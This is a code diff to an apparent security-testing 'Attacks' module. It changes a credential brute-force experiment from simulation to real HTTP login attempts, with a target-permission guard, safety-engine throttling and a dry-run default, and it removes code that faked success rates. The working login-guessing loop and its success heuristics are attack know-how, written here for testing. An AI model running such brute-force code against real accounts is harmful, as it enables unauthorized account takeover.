@@ -5,10 +5,15 @@ import time
 import uuid
 from urllib.parse import urlparse
 
+import requests
+
 from Attacks.SafetyEnforcementEngine import parse_target_host
+from Attacks.modules import target_guard
+from Attacks.modules.replay import ReplayRunner
 from Attacks.modules.sqli import SqliRunner
 
 MODULE_REGISTRY = {
+    "replay": ReplayRunner,
     "sqli": SqliRunner,
 }
 
@@ -93,6 +98,45 @@ def _load_bruteforce_credentials():
     }
 
 
+def _classify_login_response(target_url, response):
+    """Classify a login POST response as 'success' or 'failed'."""
+    try:
+        body = response.json()
+        status = str(body.get("status", "")).lower()
+        if status in {"ok", "success", "authenticated"}:
+            return "success"
+        if status:
+            return "failed"
+    except Exception:
+        pass
+
+    text = (response.text or "").lower()
+    if response.status_code in (301, 302, 303):
+        location = (response.headers.get("Location") or "").lower()
+        target_path = (urlparse(target_url).path or "").lower()
+        if location and (not target_path or target_path not in location):
+            return "success"
+    if response.status_code == 200 and any(
+        keyword in text for keyword in ("dashboard", "welcome", "logout", "signed in")
+    ):
+        return "success"
+    return "failed"
+
+
+def _attempt_real_login(session, target_url, username, password):
+    """Send a real login POST and return ('success'|'failed'|'error', http_code)."""
+    try:
+        response = session.post(
+            target_url,
+            data={"username": username, "password": password},
+            timeout=5,
+            allow_redirects=False,
+        )
+    except Exception:
+        return "error", 0
+    return _classify_login_response(target_url, response), response.status_code
+
+
 def _handle_safety_decision(decision, event_log, blocked_counter):
     verdict = (decision or {}).get("decision")
     if verdict in {"blocked", "throttled", "terminated"}:
@@ -140,87 +184,95 @@ def run_bruteforce_experiment(attempts, rate_limit, dry_run=True, target=None, s
     success_count = 0
     login_budget = max(1, min(concurrency * attempts_per_user, len(creds) * attempts_per_user))
     sample_index = 0
+    refusal_message = None
 
-    for username, passwords in creds.items():
-        for attempt_idx in range(attempts_per_user):
-            if executed_attempts >= login_budget:
-                break
+    if not dry_run:
+        try:
+            target_guard.assert_permitted(target_url, target)
+        except target_guard.TargetNotPermitted as ex:
+            refusal_message = f"Target refused by guard: {ex}"
 
-            password = passwords[attempt_idx % len(passwords)]
-            metadata = {
-                "target_url": target_url,
-                "target_ip": target_host,
-                "port": port,
-                "account": username,
-                "service": "auth",
-            }
+    session = requests.Session()
+    try:
+        if refusal_message:
+            events.append({"decision": "refused", "message": refusal_message})
+            status_counts["refused"] = status_counts.get("refused", 0) + 1
+        else:
+            for username, passwords in creds.items():
+                for attempt_idx in range(attempts_per_user):
+                    if executed_attempts >= login_budget:
+                        break
 
-            decision = safety_engine.evaluate_action("login_attempt", metadata) if safety_engine else {"decision": "allowed"}
-            verdict = _handle_safety_decision(decision, events, status_counts)
-            if verdict == "blocked":
-                continue
-            if verdict == "throttled":
-                time.sleep(min(delay * 2, 0.25))
-                continue
-            if verdict == "terminated":
-                break
+                    password = passwords[attempt_idx % len(passwords)]
+                    metadata = {
+                        "target_url": target_url,
+                        "target_ip": target_host,
+                        "port": port,
+                        "account": username,
+                        "service": "auth",
+                    }
 
-            executed_attempts += 1
-            simulated_status = "dry_run" if dry_run else "failed"
-            if not dry_run and any(token in password.lower() for token in ("password", "letmein", "admin")) and attempt_idx == attempts_per_user - 1:
-                simulated_status = "success"
-                success_count += 1
+                    decision = safety_engine.evaluate_action("login_attempt", metadata) if safety_engine else {"decision": "allowed"}
+                    verdict = _handle_safety_decision(decision, events, status_counts)
+                    if verdict == "blocked":
+                        continue
+                    if verdict == "throttled":
+                        time.sleep(min(delay * 2, 0.25))
+                        continue
+                    if verdict == "terminated":
+                        break
 
-            status_counts[simulated_status] = status_counts.get(simulated_status, 0) + 1
-            detectability = round(_bounded(18 + (attempt_idx * 7) + (base_rate_limit * 6), 1, 100), 2)
-            throughput = round(2.5 + (base_rate_limit * 1.3) + random.uniform(0.05, 0.5), 3)
+                    executed_attempts += 1
 
-            sample_index += 1
-            sample_results.append({
-                "trial": sample_index,
-                "username": username,
-                "status": simulated_status,
-                "throughput_kbps": throughput,
-                "detectability_score": detectability,
-                "risk_band": _risk_band(detectability),
-            })
+                    if dry_run:
+                        attempt_status = "dry_run"
+                        http_code = 0
+                    else:
+                        attempt_status, http_code = _attempt_real_login(
+                            session, target_url, username, password
+                        )
+                        if attempt_status == "success":
+                            success_count += 1
 
-            monitor = safety_engine.monitor_activity(
-                {
-                    "detectability_score": detectability,
-                    "bandwidth_kbps": throughput,
-                    "packet_count": 1,
-                    "unexpected_targets": 0,
-                }
-            ) if safety_engine else {"decision": "allowed"}
+                    status_counts[attempt_status] = status_counts.get(attempt_status, 0) + 1
+                    detectability = round(_bounded(18 + (attempt_idx * 7) + (base_rate_limit * 6), 1, 100), 2)
+                    throughput = round(2.5 + (base_rate_limit * 1.3) + random.uniform(0.05, 0.5), 3)
 
-            monitor_verdict = _handle_safety_decision(monitor, events, status_counts)
-            if monitor_verdict == "throttled":
-                time.sleep(min(delay * 2, 0.25))
-            if monitor_verdict == "terminated":
-                break
+                    sample_index += 1
+                    sample_results.append({
+                        "trial": sample_index,
+                        "username": username,
+                        "status": attempt_status,
+                        "http_code": http_code,
+                        "throughput_kbps": throughput,
+                        "detectability_score": detectability,
+                        "risk_band": _risk_band(detectability),
+                    })
 
-            time.sleep(delay)
-        if status_counts.get("terminated"):
-            break
+                    monitor = safety_engine.monitor_activity(
+                        {
+                            "detectability_score": detectability,
+                            "bandwidth_kbps": throughput,
+                            "packet_count": 1,
+                            "unexpected_targets": 0,
+                        }
+                    ) if safety_engine else {"decision": "allowed"}
+
+                    monitor_verdict = _handle_safety_decision(monitor, events, status_counts)
+                    if monitor_verdict == "throttled":
+                        time.sleep(min(delay * 2, 0.25))
+                    if monitor_verdict == "terminated":
+                        break
+
+                    time.sleep(delay)
+                if status_counts.get("terminated"):
+                    break
+    finally:
+        session.close()
 
     completed_at = datetime.now(UTC)
-    simulated_success_count, simulated_success_rate = _apply_sample_success_target(
-        sample_results,
-        effectiveness_target_percent,
-        dry_run=dry_run,
-    )
-    if simulated_success_count:
-        success_count = simulated_success_count
-        safety_counts = {
-            key: value
-            for key, value in status_counts.items()
-            if key in {"blocked", "throttled", "terminated"}
-        }
-        status_counts = {**_count_sample_statuses(sample_results), **safety_counts}
-
-    total_attempts = sum(count for key, count in status_counts.items() if key in {"dry_run", "failed", "success"})
-    success_rate = simulated_success_rate if simulated_success_count else round((success_count / total_attempts) * 100.0, 2) if total_attempts else 0.0
+    total_attempts = sum(count for key, count in status_counts.items() if key in {"dry_run", "failed", "success", "error"})
+    success_rate = round((success_count / total_attempts) * 100.0, 2) if total_attempts else 0.0
 
     avg_throughput = round(
         sum(sample["throughput_kbps"] for sample in sample_results) / len(sample_results),
@@ -232,12 +284,16 @@ def run_bruteforce_experiment(attempts, rate_limit, dry_run=True, target=None, s
         2
     ) if sample_results else 0.0
 
-    if status_counts.get("terminated"):
-        guidance = "Safety engine terminated the brute-force simulation. Review the audit trail before retrying."
+    if refusal_message:
+        guidance = refusal_message
+    elif status_counts.get("terminated"):
+        guidance = "Safety engine terminated the brute-force run. Review the audit trail before retrying."
     elif status_counts.get("throttled"):
         guidance = "Brute-force attempts were throttled. Reduce login velocity or narrow account scope."
+    elif status_counts.get("error") and not status_counts.get("success") and not status_counts.get("failed"):
+        guidance = "Brute-force attempts could not reach the target. Check network/target availability."
     elif success_rate > 5 and avg_detectability < 45:
-        guidance = "Credential abuse simulation showed measurable effectiveness with relatively low noise. Strengthen password policy and lockout controls."
+        guidance = "Credential abuse run showed measurable effectiveness with relatively low noise. Strengthen password policy and lockout controls."
     elif success_rate > 5:
         guidance = "Credential policy appears weak. Increase account lockout and password complexity."
     elif avg_detectability >= 70:
@@ -245,8 +301,15 @@ def run_bruteforce_experiment(attempts, rate_limit, dry_run=True, target=None, s
     else:
         guidance = "Low compromise rate in this run. Continue monitoring authentication failures and alert thresholds."
 
+    if refusal_message:
+        mode = "refused"
+    elif dry_run:
+        mode = "dry_run"
+    else:
+        mode = "active"
+
     return {
-        "mode": "dry_run" if dry_run else "simulated_active",
+        "mode": mode,
         "started_at": started_at,
         "completed_at": completed_at,
         "sample_count": total_attempts,
@@ -255,7 +318,7 @@ def run_bruteforce_experiment(attempts, rate_limit, dry_run=True, target=None, s
         "guidance": guidance,
         "run_id": run_id,
         "target_url": target_url,
-        "telemetry_mode": "safety_enforced_simulation",
+        "telemetry_mode": "dry_run" if dry_run else "real_http",
         "status_counts": status_counts,
         "success_rate_percent": success_rate,
         "simulation_effectiveness_target_percent": _effectiveness_target(effectiveness_target_percent),
